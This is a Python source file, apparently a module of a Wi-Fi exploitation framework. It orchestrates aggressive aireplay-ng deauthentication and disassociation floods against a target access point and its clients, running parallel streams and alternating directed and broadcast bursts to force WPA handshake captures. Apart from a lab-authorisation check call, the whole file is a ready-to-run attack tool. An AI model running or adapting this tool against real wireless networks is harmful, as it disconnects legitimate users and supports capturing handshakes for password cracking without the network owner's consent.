"""High-intensity deauthentication / disassociation bursts via ``aireplay-ng`` (subprocess).

Tuned for lab handshake harvesting: multi-burst loops, optional parallel streams, AP+client
alternation. Does **not** defeat 802.11w mandatory PMF.

Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""

from __future__ import annotations

import os
import shutil
import subprocess
import threading
import time

from wirelessxpl.core.exploit import *

from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab, warn_pmf_ios


class Exploit(Exploit):
    """Aggressive aireplay-ng -0 orchestration."""

    __info__ = {
        "name": "aireplay-ng deauth / disassoc barrage",
        "description": "Runs repeated aireplay-ng -0 bursts; optional dual-target alternation "
                       "(BSSID + STA) and parallel streams for stubborn clients. Requires "
                       "monitor-mode interface + injection-capable driver.",
        "authors": ("André Henrique (@mrhenrike)",),
        "references": ("https://www.aircrack-ng.org/doku.php?id=aireplay-ng",),
        "devices": ("Linux lab interface (monitor mode)",),
    }

    interface = OptString("", "Monitor-mode interface (e.g. wlan0mon)")
    bssid = OptString("", "Target AP BSSID (AA:BB:CC:DD:EE:FF)")
    station = OptString(
        "",
        "Target STA MAC (empty = broadcast deauth; set for directed kicks)",
    )
    bursts = OptInteger(30, "Number of outer loop iterations (0 = run until timeout)")
    packets_per_burst = OptInteger(64, "Deauth frames per burst (-0 argument)")
    burst_delay_s = OptFloat(0.05, "Sleep between bursts")
    parallel_streams = OptInteger(2, "Concurrent aireplay workers (staggered start)")
    alternate_station_none = OptBool(
        True,
        "Alternate directed (-c STA) and broadcast (-c FF:FF:...) bursts when STA set",
    )
    timeout_s = OptInteger(300, "Max seconds total (0 = no limit; use bursts=0 carefully)")
    extra_aireplay_args = OptString(
        "",
        "Extra args appended before interface (advanced)",
        advanced=True,
    )

    def run(self) -> None:
        require_authorised_lab()
        warn_pmf_ios()

        if not self.interface or not self.bssid:
            print_error("Set interface (monitor) and bssid.")
            return
        aireplay = shutil.which("aireplay-ng")
        if not aireplay:
            print_error("aireplay-ng not found. Install aircrack-ng suite.")
            return

        stop_at = time.monotonic() + float(self.timeout_s) if int(self.timeout_s) > 0 else None
        total_bursts = int(self.bursts)
        n_streams = max(1, int(self.parallel_streams))

        print_status(
            "Starting barrage: iface={} ap={} sta={} p/burst={} streams={}".format(
                self.interface,
                self.bssid,
                self.station or "(broadcast)",
                self.packets_per_burst,
                n_streams,
            )
        )

        def _one_burst(stream_id: int, burst_idx: int) -> None:
            sta = str(self.station).strip()
            use_broadcast = False
            if sta and self.alternate_station_none:
                use_broadcast = (burst_idx + stream_id) % 2 == 1
            target_sta: str
            if not sta:
                target_sta = "FF:FF:FF:FF:FF:FF"
            elif use_broadcast:
                target_sta = "FF:FF:FF:FF:FF:FF"
            else:
                target_sta = sta

            cmd = [
                aireplay,
                "-0",
                str(int(self.packets_per_burst)),
                "-a",
                self.bssid,
                "-c",
                target_sta,
            ]
            extra = str(self.extra_aireplay_args).strip()
            if extra:
                cmd.extend(extra.split())
            cmd.append(self.interface)
            try:
                subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=max(5, int(self.subprocess_timeout_s)),
                )
            except subprocess.TimeoutExpired:
                print_status("aireplay burst hit subprocess timeout (continuing).")

        burst_counter = 0
        try:
            while True:
                if stop_at is not None and time.monotonic() > stop_at:
                    print_status("Timeout reached — stopping.")
                    break
                if total_bursts > 0 and burst_counter >= total_bursts:
                    break

                threads: list[threading.Thread] = []

                def _worker(sid: int) -> None:
                    _one_burst(sid, burst_counter)

                for sid in range(n_streams):
                    t = threading.Thread(target=_worker, args=(sid,), daemon=True)
                    threads.append(t)
                    t.start()
                    time.sleep(0.01)
                for t in threads:
                    t.join()

                burst_counter += 1
                time.sleep(float(self.burst_delay_s))
        except KeyboardInterrupt:
            print_status("Interrupted by user.")

        print_success("Completed {} burst cycles.".format(burst_counter))
